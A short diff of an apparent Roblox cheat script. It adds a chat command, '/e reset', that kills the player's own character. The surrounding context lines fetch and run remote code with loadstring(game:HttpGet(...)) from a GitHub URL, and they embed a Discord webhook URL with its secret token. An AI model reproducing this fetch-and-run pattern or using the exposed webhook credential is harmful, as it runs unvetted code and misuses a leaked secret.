@@ -84,7 +84,11 @@ if table.find(keys, _G.key) then
         	end
         end
     end)
-
+    game.Players.LocalPlayer.Chatted:Connect(function(msg)
+            if msg == "/e reset" then
+               game.Players.LocalPlayer.Character.Humanoid.Health = 0 
+            end
+    end)
 
     loadstring(game:HttpGet("https://raw.githubusercontent.com/OneFool/fool-hub/main/thing3"))()
     local Hook = 'https://discord.com/api/webhooks/1085337504133165187/3zGpT92eyPRWOoyJJshpJxupv81UyX23tXGbiUxktOy8zta53kJ_h2w_TYNQuG8EaDNn'
